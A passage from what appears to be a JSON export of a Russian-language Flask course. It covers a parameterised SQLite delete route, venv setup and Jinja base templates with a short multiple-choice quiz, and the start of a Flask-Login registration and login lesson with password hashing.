class=\"language-python\">@app.route('/delete/&lt;int:item_id&gt;', methods=['POST'])</code></pre><p>Создаёт HTTP-маршрут <code>/delete/&lt;int:item_id&gt;</code></p><p><code>&lt;int:item_id&gt;</code> — динамическая часть URL</p><p>Flask автоматически:</p><p>- преобразует значение в int;</p><p>- передаёт его в функцию delete_item.</p><p><code>methods=['POST']</code></p><p>маршрут принимает только POST-запросы;</p><p>GET-запрос к этому URL приведёт к ошибке 405 Method Not Allowed.</p><p>&nbsp;</p><p>Объявление обработчика</p><p><code>def delete_item(item_id)</code></p><p>Функция вызывается только если:</p><p>URL соответствует /delete/число;</p><p>метод запроса — POST.</p><p>item_id — это идентификатор записи, которую нужно удалить.</p><p>&nbsp;</p><p><code>db = get_db()</code></p><p>Получение соединения с базой данных</p><p>&nbsp;</p><p>Создание курсора</p><p><code>cursor = db.cursor()</code></p><p>Курсор нужен для выполнения SQL-запросов.</p><p>- отправляет запросы в БД;</p><p>- получает результаты (если они есть).</p><p>&nbsp;</p><p>SQL-запрос на удаление</p><pre><code class=\"language-python\">cursor.execute(\r\n &nbsp;&nbsp; 'DELETE FROM items WHERE id = ?',\r\n &nbsp;&nbsp; (item_id,)\r\n)</code></pre><p>Выполняется SQL-команда:</p><p><code>DELETE FROM items WHERE id = ?</code></p><p>? — плейсхолдер параметра (item_id,)</p><p>(item_id,) - это кортеж из одного элемента.</p><p>Такая форма записи, когда в SQL-запрос, вместо реального значения ставится знак вопроса:</p><p>- защищает от SQL-инъекций;</p><p>- гарантирует корректную подстановку значения.</p><p>&nbsp;</p><p><code>db.commit()</code></p><p>Подтверждает изменения в базе данных.</p><p>&nbsp;</p><p>Перенаправление пользователя</p><p><code>return redirect(url_for('index'))</code></p><p>После удаления:</p><p>пользователь не остаётся на /delete/, а перенаправляется на index.</p><p>&nbsp;</p><p>Итоговая логика</p><p>POST выбран потому что:</p><p>операция изменяет состояние сервера;</p><p>требуется защита от случайных действий;</p><p>нужна CSRF-защита;</p><p>соблюдается HTTP-семантика;</p><p>код безопасен и предсказуем.</p><p>&nbsp;</p><p>&nbsp;</p><p style=\"text-align:center;\"><strong>Это простой пример приложения, чтобы начать понимать работу</strong></p><p style=\"text-align:center;\"><strong>Flask и SQLite!</strong></p><p>&nbsp;</p><p>&nbsp;</p><h4>Что важно запомнить</h4><p>SQLite — лёгковесная файловая база данных, удобная для обучения, прототипов и простых проектов. Хранит данные в одном файле. Не требует сервера.</p><p>Flask легко интегрируется с БД</p><p>SQL-запросы можно писать вручную, на чистом, стандартном SQL (без ORM)</p><p>Flask-WTF обеспечивает:</p><p>- формы</p><p>- валидацию</p><p>- CSRF-защиту</p><p>Редиректы выполняются через redirect()</p><p>Даже в простом приложении важно думать о безопасности</p><p>&nbsp;</p><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 3,
            "section_id": 2,
            "number": 1,
            "name": "Создание базового приложения",
            "slug": "create-base-app",
            "content": {
                "tasks": [],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "HTML-шаблон Jinja",
                            "CSS-фреймворк Bootstrap",
                            "СУБД SQLite",
                            "Маршрутизатор Flask "
                        ],
                        "question": "Какой компонент Flask отвечает за выбор функции-обработчика в зависимости от URL?",
                        "correct_index": 3
                    },
                    {
                        "id": 2,
                        "options": [
                            "pip install venv",
                            "flask create venv",
                            "python -m venv venv ",
                            "python create venv"
                        ],
                        "question": "Какую команду используют для создания виртуального окружения venv?",
                        "correct_index": 2
                    },
                    {
                        "id": 3,
                        "options": [
                            "Создаёт новый HTML-файл в директории templates",
                            "Преобразует HTML-шаблон Jinja в готовый HTML-ответ ",
                            "Запускает веб-сервер Flask",
                            "Создаёт новый шаблон"
                        ],
                        "question": "Какую функцию выполняет render_template() во Flask-приложении?",
                        "correct_index": 1
                    },
                    {
                        "id": 4,
                        "options": [
                            "Связывает URL / с конкретной функцией-обработчиком ",
                            "Определяет имя HTML-шаблона",
                            "Создаёт базовый маршрут для базы данных",
                            "Включает режим отладки приложения"
                        ],
                        "question": "Что означает декоратор @app.route('/') в коде Flask?",
                        "correct_index": 0
                    },
                    {
                        "id": 5,
                        "options": [
                            "Для наследования общей структуры HTML из базового шаблона ",
                            "Для расширения файла 'base.html'",
                            "Для регистрации маршрута 'base.html'",
                            "Для передачи данных в шаблон 'base.html'"
                        ],
                        "question": "Зачем используется конструкция {% extends 'base.html' %} в шаблоне index.html?",
                        "correct_index": 0
                    },
                    {
                        "id": 6,
                        "options": [
                            "Подключает JavaScript-код Bootstrap",
                            "Определяет место, куда подставляется уникальный контент страницы ",
                            "Создаёт HTML-форму",
                            "Определяет URL страницы"
                        ],
                        "question": "Какое назначение у блока {% block content %} в шаблонах Jinja?",
                        "correct_index": 1
                    },
                    {
                        "id": 7,
                        "options": [
                            "Он не поддерживает HTML-шаблоны",
                            "Он не работает с базами данных",
                            "Он небезопасен и предназначен только для разработки ",
                            "Он не поддерживает Bootstrap"
                        ],
                        "question": "Почему не рекомендуется использовать встроенный сервер Flask в продакшене?",
                        "correct_index": 2
                    }
                ],
                "theory_html": "<h4><span style=\"background-color:white;\">Введение.</span></h4><p>С помощью этого руководства вы с нуля разработаете простое веб-приложение — мини-блог, в котором пользователь сможет создавать, просматривать, редактировать и удалять посты.</p><p>Веб-приложение напишем на Flask с использованием СУБД&nbsp;SQLite&nbsp;для хранения текста постов блога. Визуальное оформление сделаем не на чистом CSS, а с помощью&nbsp;CSS-фреймворка Bootstrap.</p><p style=\"text-align:center;\">&nbsp;</p><p style=\"text-align:center;\">Схема работы создаваемого веб-приложения:</p><figure class=\"image image_resized\" style=\"width:72.54%;\"><img style=\"aspect-ratio:1036/689;\" src=\"https://gvylosdtlepiikialkhn.supabase.co/storage/v1/object/public/lesson-images/488b30ff-5f1e-4678-b6d2-349107390cec.png\" width=\"1036\" height=\"689\"></figure><p>HTTP-запросы поступают из браузера пользователя на web-сервер. Во время разработки это встроенный во Flask локальный <strong>development server</strong> (на базе Werkzeug). В продакшене Flask работает на WSGI/ASGI-сервером (Gunicorn, uWSGI, Waitress и др.).</p><p>Веб-сервер передает запрос в веб-приложение, маршрутизатор которого в зависимости от URL запроса вызывает подходящую функцию-обработчик.</p><p>Функция-обработчик выполняет запрос к базе данных SQLite, чтобы получить или записать необходимые данные.</p><p>Полученные из БД данные функция передает в подходящий HTML-шаблон Jinja, который возвращает готовый HTML-код страницы.</p><p>Полученный HTML-код передается на веб-сервер, который в свою очередь передает этот код в браузер пользователя.</p><p><span style=\"background-color:white;\">&nbsp;</span></p><h4><span style=\"background-color:white;\">Начало</span></h4><p><span style=\"background-color:white;\">Перед началом мы будем иметь в виду, что у вас установлен Python, что вы пользуетесь редактором VS Code и что в редакторе установлен комплект расширений для работы с Python от Microsoft, включая встроенный интерпретатор и кнопку запуска python-файлов ►в правом верхнем углу редактора кода.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">1. В директории текущего пользователя создайте директорию проекта flask_blog, в которой будет находиться приложение.</span></p><p><span style=\"background-color:white;\">Проект будет создаваться с использованием виртуального окружения venv. Виртуальное окружение позволяет изолировать среду выполнения проекта (веб-приложения Flask), от других процессов в операционной системы. Также изолированно работает приложение и на реальном (\"боевом\") веб-сервере. Также, в это виртуальное окружение (а не глобально) происходит установка пакета самого фреймворка Flask и всех необходимых библиотек и инструментов.</span></p><p><span style=\"background-color:white;\">Описание установки фреймворка и пакетов будет описываться, прежде всего, для ОС Windows. Если у вас другая ОС - команды будут похожи, но с небольшими изменениями. Синтаксис команд узнайте в ChatGPT.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">2. Создайте виртуальное окружение venv:</span></p><p><span style=\"background-color:white;\"><code>python -m venv venv</code></span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">3. Активируйте созданное виртуальное окружение:</span></p><p><code>venv\\Scripts\\activate</code></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">После активации виртуального окружения в терминале появится префикс </span><span style=\"font-family:&quot;Courier New&quot;;\">(venv)</span><span style=\"background-color:white;\">. Что то типа:</span></p><p><span style=\"font-family:&quot;Courier New&quot;;\"><code>(venv) PS F:\\flask_blog&gt;</code></span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\"><i>Примечание. На этапе 2 или 3 велика вероятность возникновения ошибок, возможно связанных с конфликтом версий Python и его окружения. Ошибки вы увидите в терминале. В этом случае задайте вопрос в ChatGPT скопировав команду и ту ошибку которую она вызывает.</i></span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">4. Установите Flask:</span></p><p><span style=\"background-color:white;font-family:&quot;Courier New&quot;;\"><code>pip install flask</code></span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">Результат (примерный):</span></p><p><span style=\"background-color:white;font-family:&quot;Courier New&quot;;font-size:12.0pt;\">Successfully installed Jinja2-3.1.3 MarkupSafe-2.1.5 Werkzeug-3.0.1 blinker-1.7.0 click-8.1.7 flask-3.0.2 itsdangerous-2.1.2</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">5. Проверьте, что Flask установился командой:</span></p><p><span style=\"background-color:white;font-family:&quot;Courier New&quot;;\"><code>flask --version</code></span></p><p>&nbsp;</p><h4><span style=\"background-color:white;\">Создадим минимально работающее Flask-web-приложение - основу будущего блога (повторение)</span></h4><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">1. В директории проекта </span><span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">flask_blog </span>создайте обязательные директории templates и static.<span style=\"background-color:white;\"> Создайте и откройте файл </span><span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">app.py.</span></p><p><span style=\"background-color:white;\">Наберите в нём следующий код:</span></p><pre><code class=\"language-python\">from flask import Flask, render_template\r\n \r\napp = Flask(__name__)\r\n \r\n@app.route('/')\r\ndef index():\r\n &nbsp; return render_template('index.html')\r\n \r\nif __name__ == '__main__':\r\n &nbsp; app.run(debug=True)</code></pre><p><span style=\"background-color:white;\">В этом коде:</span></p><p><span style=\"background-color:white;\">Импортируется объект Flask из пакета flask и функция render_template(), которая позволяет визуализировать шаблоны HTML.</span></p><p><span style=\"background-color:white;\">Создается экземпляр приложения Flask с именем app. Специальная переменная </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">__name__</span><span style=\"background-color:white;\"> содержит имя текущего модуля Python и указывает экземпляру его расположение. Это необходимо, так как Flask устанавливает ряд путей внутри приложения.</span></p><p><span style=\"background-color:white;\">С помощью декоратора </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">@app.route('/')</span><span style=\"background-color:white;\"> функция Python превращается в функцию визуализации Flask. Функция визуализации конвертирует возвращаемое значение в HTTP-ответ, который может быть обработан HTTP-клиентом, таким как веб-браузер. Значение '/' в маршруте </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">@app.route()​​</span><span style=\"background-color:white;\"> устанавливает, что эта функция будет отвечать на веб-запросы для URL /, который является основным URL-адресом веб-приложения.</span></p><p><span style=\"background-color:white;\">Функция index(), возвращает (return) результат вызова вспомогательной функции render_template() с аргументом index.html​​. Аргумент функции указывает на файл шаблона, который должен быть расположен в директории шаблонов templates и который будет использован для визуализации.</span></p><p><span style=\"background-color:white;\">Использовать в приложении шаблоны web-страниц позволяет вспомогательная функция render_template(), в которой доступен механизм шаблонов Jinja. Вы будете использовать шаблоны HTML для создания страниц приложения: главной страницы со списком текущих постов блога и страниц создания, просмотра и редактирования поста.</span></p><p><span style=\"background-color:white;\">Файл index.html еще не создан. Вы получите сообщение об ошибке, если запустите приложение на этом этапе.</span></p><p><span style=\"background-color:white;\">Последние две строки запускают сервер и приложение. (на реальном сервере на хостинге этот будет по другому).</span></p><p><span style=\"background-color:white;font-size:13.0pt;\">&nbsp;</span></p><p><span style=\"background-color:white;font-size:13.0pt;\">2. Создание </span><span style=\"background-color:white;\">базового шаблона.</span></p><p><span style=\"background-color:white;\">Во всех HTML-шаблонах потребуется повторить большую часть кода HTML, например Хэдер, Футер, Навигация и т.п. Чтобы избежать ненужного дублирования кода, создадим файл базового шаблона, который будет служить родителем для всех остальных HTML-шаблонов проекта.</span></p><p>&nbsp;</p><p><span style=\"background-color:white;\">Создайте файл base.html в директории templates</span>.</p><p><span style=\"background-color:white;\">Кроме директории </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">templates</span><span style=\"background-color:white;\"> в веб-приложениях Flask также существует директория </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">static</span><span style=\"background-color:white;\">, в которой сохраняются статичные файлы (т.е. те, которые не изменяются на сервере программным кодом), такие как стили CSS, скрипты JavaScript или изображения, используемые приложением.</span></p><p><span style=\"background-color:white;\">По умолчанию мы не будем создавать собственный CSS-файл и писать CSS-стили, а воспользуемся CSS-фреймворком Bootstrap, который предлагает простые и удобные в использовании элементы оформления приложения. Нам нужно подключить этот фреймворк (а это, по сути, большой CSS-файл), а затем просто применить к html-элементам наших страниц (шаблонов) соответствующие классы.</span></p><p>&nbsp;</p><p><span style=\"background-color:white;\">Добавьте в </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">base.html</span><span style=\"background-color:white;\"> следующий код:</span></p><pre><code class=\"language-jinja2\">&lt;!doctype html&gt;\r\n&lt;html lang=\"ru\"&gt;\r\n  &lt;head&gt;\r\n &nbsp;&nbsp; &lt;meta charset=\"utf-8\"&gt;\r\n &nbsp;&nbsp; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\r\n&lt;!-- Bootstrap CSS --&gt;\r\n &nbsp;&nbsp; &lt;link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css\" rel=\"stylesheet\"&gt;\r\n &nbsp;&nbsp; &lt;script defer src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js\"&gt;&lt;/script&gt;\r\n &nbsp;&nbsp; &lt;title&gt;{% block title %} {% endblock %}&lt;/title&gt;\r\n  &lt;/head&gt;\r\n  &lt;body&gt;\r\n &nbsp;&nbsp; &lt;nav class=\"navbar navbar-expand-lg bg-light\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp; &lt;div class=\"container-fluid\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;a class=\"navbar-brand\" href=\"{{ url_for('index')}}\"&gt;FlaskBlog&lt;/a&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;button class=\"navbar-toggler\" type=\"button\" data-bs-toggle=\"collapse\" data-bs-target=\"#navbarSupportedContent\" aria-controls=\"navbarSupportedContent\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/button&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;ul class=\"navbar-nav me-auto mb-2 mb-lg-0\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;li class=\"nav-item\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;a class=\"nav-link active\" href=\"{{ url_for('index') }}\"&gt;Главная&lt;/a&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/li&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/ul&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/div&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp; &lt;/div&gt;\r\n &nbsp;&nbsp; &lt;/nav&gt;\r\n &nbsp;&nbsp; &lt;div class=\"container\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp; {% block content %} {% endblock %}\r\n &nbsp;&nbsp; &lt;/div&gt;\r\n  &lt;/body&gt;\r\n&lt;/html&gt;</code></pre><p><span style=\"background-color:white;\">В этот файл входит HTML-код базового шаблона, т.е. такой код, который повторяется на всех страницах. Для большинства тэгов добавлены специальные Bootstrap-классы, для которых во фреймворке Bootstrap описаны соответствующие стили. (Иногда, по названию классов на английском можно, примерно, догадаться, что они делают. Теги &lt;meta&gt; содержат информацию для браузера, тег &lt;link&gt; — загружает с удалённого сервера и подключает файл CSS Bootstrap, а тег &lt;script&gt; — загружает и подключает файл JavaScript, который позволяет реализовать ряд дополнительных функций Bootstrap. (в нашем проекте JavaScript реализует открывание и закрывание меню при смартфонном размере окна браузера).</span></p><p><span style=\"background-color:white;\">Следующие части кода относятся к механизму шаблонов Jinja</span>.</p><p><span style=\"background-color:white;font-family:&quot;Courier New&quot;;\">{% block title %} {% endblock %}</span><span style=\"background-color:white;\"> — блок, замещающий заголовок. Вы будете использовать его в других шаблонах для написания уникальных заголовков для разных страниц приложения. Это позволит избежать перезаписи раздела &lt;head&gt;.</span></p><p>Видимая часть страницы (&lt;body&gt;) начинается с блока навигационного меню, в котором для элементов добавляются CSS-классы из фреймворка Bootstrap. Эти CSS-классы описаны в CSS-файле фреймворка и применяют определённую стилизацию. Понимание имён и назначения этих классов, как и изучение css-фреймворка Bootstrap выходит за рамки нашего курса. Впрочем, вы можете задать вопрос в ChatGPT что означает тот или иной класс Bootstrap. По желанию вы можете менять стилизацию, путём замены и добавления классов, делая соответствующие запросы в ChatGPT.</p><p><span style=\"background-color:white;font-family:&quot;Courier New&quot;;\">{{url_for('index')}}</span><span style=\"background-color:white;\"> — вызов функции, которая возвращает URL для функции визуализации index(). В функцию передается только один аргумент — имя функции визуализации, которая вместо файла привязывается к маршруту, связанному с этой функцией визуализации.</span></p><p><span style=\"background-color:white;font-family:&quot;Courier New&quot;;\">{% block content %} {% endblock %}</span><span style=\"background-color:white;\"> — блок, в который будет подставлен определенный контент в зависимости от конечного шаблона.</span></p><p>&nbsp;</p><p>3. <span style=\"background-color:white;\">Создание HTML-шаблона главной страницы.</span></p><p><span style=\"background-color:white;\">Создайте файл index.html в директории templates</span>. В терминологии Flask (и вообще всех фреймворков) это называется html-шаблон.</p><p><span style=\"background-color:white;\">Вставьте в index.html следующий код:</span></p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n \r\n{% block title %} Welcome to FlaskBlog {% endblock %}\r\n{% block content %}\r\n  &lt;h1&gt; Добро пожаловать в FlaskBlog &lt;/h1&gt;\r\n{% endblock %}</code></pre><p><span style=\"background-color:white;\">В этом коде:</span></p><p><span style=\"background-color:white;font-family:&quot;Courier New&quot;;\">{% extends 'base.html' %}</span><span style=\"background-color:white;\"> — указывает, что текущий шаблон наследует из шаблона base.html.</span> <span style=\"background-color:white;font-family:&quot;Courier New&quot;;\">{% block title %} ... {% endblock %}</span><span style=\"background-color:white;\"> — содержит заголовок, который будет подставлен вместо переменной в соответствующий блок шаблона-родителя base.html.</span> <span style=\"background-color:white;font-family:&quot;Courier New&quot;;\">{% block content %} ... {% endblock %}</span><span style=\"background-color:white;\"> — содержит контент, который будет подставлен вместо переменной в соответствующий блок шаблона-родителя base.html.</span></p><p>&nbsp;</p><p>4. <span style=\"background-color:white;\">Запустите сервер и приложение путём запуска на выполнение файла app.py обычным образом.</span></p><p><span style=\"background-color:white;\">Лучше всего это сделать через расширение python от microsoft и кнопку запуска (треугольник в правом верхнем углу). Также можно запустить файл набрав команду в терминале:</span></p><p><span style=\"font-family:&quot;Courier New&quot;;\">python app.py</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">После запуска в терминале появится что то типа:</span></p><p><span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;font-size:12.0pt;\">* Serving Flask app 'app'</span></p><p><span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;font-size:12.0pt;\">&nbsp;* Debug mode: on</span></p><p><span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;font-size:12.0pt;\">WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.</span></p><p><span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;font-size:12.0pt;\">&nbsp;* Running on http://127.0.0.1:5000</span></p><p><span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;font-size:12.0pt;\">Press CTRL+C to quit</span></p><p><span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;font-size:12.0pt;\">&nbsp;* Restarting with stat</span></p><p><span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;font-size:12.0pt;\">&nbsp;* Debugger is active!</span></p><p><span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;font-size:12.0pt;\">&nbsp;* Debugger PIN: 136-514-053</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p>Здесь для нас интересна (хотя не особо важна) следующая информация:</p><p>Название работающего приложения -&nbsp;app.</p><p><span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">Debug mode: on</span>&nbsp;означает, что отладчик Flask работает. Эта функция полезна при разработке, так как при возникновении проблем она выдает детализированные сообщения об ошибках, что упрощает работу по их устранению.</p><p>Предупреждение красным цветом <span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;font-size:12.0pt;\">WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. - </span>предупреждает, что используется упрощённый, небезопасный сервер Flask только для разработки, и что его нельзя использовать в качестве реального (\"боевого\") сервера на хостинге.</p><p>Приложение работает на стандартном адресе локального web-сервера <span style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">127.0.0.1 </span>и на порту 5000. Т.е. именно по этому адресу браузер ищет стандартный маршрут домашней страницы ' / ', делает http-запрос на получение домашней страницы index.html и рендерит её в окне браузера.</p><p>&nbsp;</p><p>Откройте запущенное приложение (домашнюю страницу) кликнув по адресу сервера удерживая нажатой клавишу ctrl.</p><p>Откроется домашняя web-страница приложения и отобразит то, что мы задали в шаблоне главной страницы.</p><p>Если css-фреймворк Bootstrap подключился правильно, вы должны увидеть стилизованную страницу.</p><figure class=\"image image_resized\" style=\"width:49.14%;\"><img style=\"aspect-ratio:1091/189;\" src=\"https://gvylosdtlepiikialkhn.supabase.co/storage/v1/object/public/lesson-images/27088c36-c155-4ecf-8c7e-f5a1e4b689f8.png\" width=\"1091\" height=\"189\"></figure><p>Если не видите стилизацию - проверьте корректность подключения Bootstrap или проконсультируйтесь в ChatGPT.<br><br>Также проверьте отображение страницы и показ меню на узких экранах</p><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 20,
            "section_id": 4,
            "number": 3,
            "name": "Логика регистрации и аутентификации",
            "slug": "registration-and-authentication",
            "content": {
                "tasks": [],
                "tests": [],
                "theory_html": "<p>В этой лекции мы оживим наше приложение. Мы научим его регистрировать новых пользователей, проверять их пароли и «запоминать» тех, кто вошел в систему.</p><p>Мы будем сохранять и получать пользователей в/из базы данных через ORM SQLAlchemy и использовать усиленные методы защиты паролей.</p><p>(Что такое ORM и SQLAlchemy почитайте самостоятельно в ChatGPT, довольно поверхностно - это выходит за рамки данного курса)</p><p>&nbsp;</p><p><strong>1. Настройка менеджера входа (Login Manager)</strong></p><p>Прежде чем обрабатывать вход, нам нужно объяснить Flask-Login, как именно находить пользователя в базе данных.</p><p>Это делается с помощью функции загрузчика.</p><p>Добавим блупринт маршрута авторизации ayth.py в файл инициализации приложения.</p><p>В файл <code>project/__init__.py</code> и замените код на следующий:</p><pre><code class=\"language-python\">from flask import Flask\r\nfrom flask_sqlalchemy import SQLAlchemy\r\nimport os\r\nfrom flask_login import LoginManager\r\n \r\ndb = SQLAlchemy()\r\n \r\ndef create_app():\r\n  app = Flask(__name__)\r\n \r\n  app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY') or 'dev-key-12345'\r\n \r\n  app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'\r\n \r\n  app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\r\n \r\n  db.init_app(app)\r\n \r\n  login_manager = LoginManager()\r\n \r\n  # Указываем, куда перенаправлять пользователя,\r\n  # если он пытается зайти на защищенную страницу без входа\r\n  login_manager.login_view = 'auth.login'\r\n  login_manager.init_app(app)\r\n \r\n  from .models import User\r\n \r\n  @login_manager.user_loader\r\n  def load_user(user_id):\r\n      return db.session.get(User, int(user_id))\r\n \r\n  from .main import main as main_blueprint\r\n  app.register_blueprint(main_blueprint)\r\n \r\n  from .auth import auth as auth_blueprint\r\n  app.register_blueprint(auth_blueprint)\r\n \r\n  return app</code></pre><p>Объяснение:</p><p>Сначала, в разделе импортов, импортируется компонент LoginManager .</p><p><code>login_manager.login_view = 'auth.login'</code></p><p>Эта строка говорит Фласку:</p><p>«Если страница требует входа, а пользователь — аноним, отправь его на страницу логина ('auth.login')».</p><p><code>user_loader</code></p><p>Это посредник. Когда браузер присылает куки (Cookie) с ID пользователя, Flask-Login вызывает эту функцию. Мы идем в базу данных и возвращаем объект User, у которого есть имя, почта и прочее.</p><p><code>db.session.get(User, int(user_id))</code></p><p>Загрузка пользователя в сессию.</p><p>Когда пользователь входит на сайт, браузер сохраняет специальный зашифрованный файл (куки) с его ID. При каждом переходе на новую страницу Flask-Login считывает этот ID и должен превратить «просто число» в «объект пользователя» (со всеми его данными: именем, почтой и т.д.). Функция <code>db.session.get(User, int(user_id))</code> как раз и выполняет этот поиск в базе данных.</p><p><code>db.session</code></p><p>Это интерфейс (сессия) для связи с вашей базой данных. Через него проходят все запросы.</p><p><code>.get()</code></p><p>Это самый быстрый способ поиска записи по её первичному ключу (Primary Key).</p><p><code>User</code></p><p>Это имя класса (модели), в таблице которого мы ищем запись.</p><p><code>int(user_id)</code></p><p>Данные из куки часто приходят в виде строки. Мы принудительно преобразуем их в целое число (int), чтобы поиск по числовому полю ID в базе прошел корректно.</p><p>Роль в безопасности:</p><p>Если эта строка не сработает или вернет None (например, если пользователя удалили из базы, но у него остались старые куки), Flask-Login поймет, что сессия недействительна, и автоматически пометит пользователя как анонимного. Это защищает приложение от ошибок авторизации.</p><p>&nbsp;</p><p><strong>2. Регистрация пользователей</strong></p><p>Теперь напишем логику сохранения пользователя. Мы не имеем права хранить пароли в чистом виде (это небезопасно). Мы будем использовать «хэширование».</p><p>&nbsp;</p><p>Создайте файл <code>project/auth.py</code> со следующим кодом:</p><pre><code class=\"language-python\">from flask import Blueprint, render_template, redirect, url_for, request, flash\r\nfrom werkzeug.security import generate_password_hash, check_password_hash\r\nfrom flask_login import login_user, logout_user, login_required\r\nfrom .models import User\r\nfrom . import db\r\n \r\nauth = Blueprint('auth', __name__)\r\n \r\n# Регистрация нового пользователя\r\n@auth.route('/signup', methods=['GET', 'POST'])\r\ndef signup():\r\n    if request.method == 'GET':\r\n        return render_template('signup.html')\r\n \r\n    # Получаем данные из полей формы\r\n    email = request.form.get('email')\r\n    name = request.form.get('name')\r\n    password = request.form.get('password')\r\n \r\n    # 1. Проверяем, нет ли уже такого пользователя\r\n    user = db.session.execute(db.select(User).filter_by(email=email)).scalar_one_or_none()\r\n \r\n    if user:\r\n        # Если пользователь найден, выводим ошибку\r\n        # и возвращаем на страницу регистрации\r\n        flash('Email адрес уже зарегистрирован')\r\n        return redirect(url_for('auth.signup'))\r\n \r\n    # 2. Создаем нового пользователя с хэшированием пароля\r\n    new_user = User(\r\n        email=email,\r\n        name=name,\r\n        password=generate_password_hash(password)\r\n    )\r\n \r\n    # 3. Сохраняем изменения в базу данных\r\n    db.session.add(new_user)\r\n    db.session.commit()\r\n \r\n    # После успешной регистрации отправляем на страницу входа\r\n    return redirect(url_for('auth.login'))\r\n \r\n# Вход пользователя\r\n@auth.route('/login', methods=['GET', 'POST'])\r\ndef login():\r\n    if request.method == 'GET':\r\n        return render_template('login.html')\r\n \r\n    email = request.form.get('email')\r\n    password = request.form.get('password')\r\n    remember = True if request.form.get('remember') else False\r\n \r\n    # Ищем пользователя по email через объект сессии\r\n    user = db.session.execute(db.select(User).filter_by(email=email)).scalar_one_or_none()\r\n \r\n    # Проверяем: существует ли пользователь и совпадает ли хэш пароля\r\n    if not user or not check_password_hash(user.password, password):\r\n        flash('Пожалуйста, проверьте логин и пароль.')\r\n        return redirect(url_for('auth.login'))\r\n \r\n    # Если проверка пройдена, создаем сессию пользователя\r\n    login_user(user, remember=remember)\r\n    return redirect(url_for('main.profile'))\r\n \r\n# Выход пользователя\r\n@auth.route('/logout')\r\n@login_required\r\ndef logout():\r\n    logout_user()\r\n    return redirect(url_for('main.index'))</code></pre><p>&nbsp;</p><p>Объяснение:</p><p>&nbsp;</p><p>1. Объяснение импортов:</p><p><code>import Blueprint</code></p><p>Этот инструмент позволяет разбивать приложение на отдельные части (модули). Например, мы создали блупринт auth для входа и main для обычных страниц. Это предотвращает создание одного гигантского файла с 